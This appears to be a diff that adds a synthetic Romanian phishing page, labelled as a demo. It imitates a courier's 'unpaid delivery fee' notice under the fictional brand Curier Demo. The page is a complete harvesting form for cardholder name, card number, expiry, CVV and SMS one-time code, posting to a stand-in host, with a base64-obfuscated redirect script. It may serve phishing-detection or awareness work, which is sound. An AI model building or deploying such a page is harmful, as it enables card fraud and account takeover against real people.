@@ -1,0 +1,34 @@
+<!doctype html>
+<html lang="ro">
+<head>
+<meta charset="utf-8">
+<!-- SINTETIC: pagină falsă de „taxă de livrare" care folosește brandul fictiv Curier Demo. -->
+<title>Curier Demo · Coletul tău așteaptă</title>
+<style>
+  body { background: #f2f2f2; color: #1d1d1d; font-family: Verdana, sans-serif; }
+  .box { max-width: 460px; margin: 30px auto; background: #ffffff; padding: 24px; border-top: 6px solid #e30613; }
+  button { background: #e30613; color: #ffffff; border: 0; padding: 12px 20px; }
+</style>
+</head>
+<body>
+<p>DEMO · pagină falsă, sintetică</p>
+<div class="box">
+  <h1>Curier Demo</h1>
+  <p>Coletul AWB 7731 nu a putut fi livrat: lipsește taxa de livrare de 4,99 lei. Achită taxa în 24 de ore, altfel coletul se returnează.</p>
+  <form action="https://colectare-date.test/colet" method="post">
+    <label for="nume">Nume pe card</label>
+    <input id="nume" name="cardholder" type="text" autocomplete="cc-name">
+    <label for="nr">Număr card</label>
+    <input id="nr" name="cc" type="text" autocomplete="cc-number">
+    <label for="exp">Expiră (LL/AA)</label>
+    <input id="exp" name="cc_exp" type="text">
+    <label for="cvv">CVV</label>
+    <input id="cvv" name="cvv2" type="text">
+    <label for="sms">Codul primit prin SMS</label>
+    <input id="sms" name="cod_sms" type="text" autocomplete="one-time-code">
+    <button type="submit">Plătește taxa</button>
+  </form>
+</div>
+<script>var u = atob("aHR0cHM6Ly9jb2xlY3RhcmUtZGF0ZS50ZXN0"); if (window.top !== window) { location.replace(u); }</script>
+</body>
+</html>
